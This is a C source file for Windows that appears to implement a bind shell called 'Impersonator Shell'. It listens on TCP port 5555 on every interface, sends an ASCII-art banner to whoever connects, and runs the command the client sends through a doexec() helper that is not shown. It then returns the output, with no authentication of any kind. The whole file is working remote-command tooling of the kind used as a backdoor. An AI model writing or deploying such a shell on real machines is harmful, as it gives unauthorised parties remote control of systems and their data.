#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include "doexec.h"

/*
* String IO Functions
*/
int header(int sockfd){

    /*print Impersonator*/
    char *print_this = " ~|~ _ _  _  _  _ _ _  _  _ _|_ _  _\r\n _|_| | ||_)(/_| _\\(_)| |(_| | (_)|\n        |    \n";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    /*print Shell*/
    char *print_that = "\r\n\t\t (~|_  _ ||\n\t\t _)| |(/_||\r\n\r\nBy Aleksa Zatezalo";
    send(sockfd, print_that, sizeof(char) * strlen(print_that), 0);

    return 0;
}

int command_prompt(int sockfd){

    /*print Impersonator*/
    char *print_this = "\n[Impersonator Shell]>";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    return 0;
}

int main()
{
    WSADATA WSAData;
    SOCKET server, client;
    SOCKADDR_IN serverAddr, clientAddr;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5555);

    bind(server, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
    listen(server, 0);

    printf("Listening for incoming connections...\n");

    char buffer[1024];
    int clientAddrSize = sizeof(clientAddr);
    while((client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize)) != INVALID_SOCKET)
    {
        printf("            Client connected!\n");
        header(client);
        command_prompt(client);
        recv(client, buffer, sizeof(buffer), 0);
        char *ans = doexec(buffer);
        send(client, ans, strlen(ans) * sizeof(char),0);
        closesocket(client);
        printf("Client disconnected.\n");
    }
}